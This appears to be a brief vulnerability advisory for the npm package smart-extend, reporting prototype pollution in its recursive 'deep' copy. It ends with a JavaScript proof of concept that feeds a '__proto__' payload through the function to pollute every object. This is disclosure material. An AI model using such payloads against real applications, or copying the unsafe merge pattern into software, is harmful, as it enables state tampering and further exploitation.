# Overview

smart-extend is an extension to jQuery's classic `extend()` method with additional features providing you with more power and control over your object extensions/clones.

Affected versions of this package are vulnerable to Prototype Pollution. `deep` function is vulnerable when it performs a recursive copy of the specified objects.

# Proof of Concept

```javascript
var extend = require('smart-extend');

var payload = '{"__proto__":{"polluted":"pwned!"}}';
var test = {};
extend.deep({},JSON.parse(payload));

console.log(test.polluted);
```
